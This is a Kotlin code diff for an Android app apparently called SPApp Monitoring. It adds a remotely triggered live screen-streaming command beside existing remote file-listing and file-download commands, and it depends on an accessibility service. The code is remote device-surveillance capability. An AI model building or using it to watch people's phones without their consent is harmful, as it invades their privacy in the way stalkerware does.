@@ -79,6 +79,7 @@ class SyncRunner(private val context: Context) {
             commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
+        commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
 
         state.lastSyncAtEpochMs = System.currentTimeMillis()
         return true
@@ -136,6 +137,7 @@ class SyncRunner(private val context: Context) {
             commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
+        commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
 
         // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
@@ -255,6 +257,90 @@ class SyncRunner(private val context: Context) {
             )
         } catch (e: Exception) {
             // Retried next sync cycle.
+        }
+    }
+
+    private suspend fun processScreenStreamCommand(bearer: String, command: RemoteCommand) {
+        val action = (command.payload?.get("action") as? String) ?: "start"
+        if (action == "stop") {
+            com.spapp.monitoring.screenstream.ScreenStreamManager.stopStreaming()
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(success = true, message = "Screen stream stopped")
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack stop screen stream", e)
+            }
+            return
+        }
+
+        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = "Live screen stream requires Android 11+ (API 30+)"
+                    )
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack screen stream API check", e)
+            }
+            return
+        }
+
+        if (com.spapp.monitoring.blocking.BlockAccessibilityService.instance == null) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = "Accessibility service is not active on this device. Please enable Accessibility for SPApp Monitoring in phone Settings."
+                    )
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack screen stream accessibility check", e)
+            }
+            return
+        }
+
+        val state = DeviceState(context)
+        val authToken = state.authToken
+        val deviceId = state.getEffectiveDeviceId()
+
+        if (authToken == null || deviceId == null) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = "Device state missing auth token or device ID"
+                    )
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack screen stream auth check", e)
+            }
+            return
+        }
+
+        com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(context, authToken, deviceId)
+
+        try {
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(
+                    success = true,
+                    message = "Screen stream started"
+                )
+            )
+        } catch (e: Exception) {
+            android.util.Log.e("SyncRunner", "Failed to ack screen stream start", e)
         }
     }
 
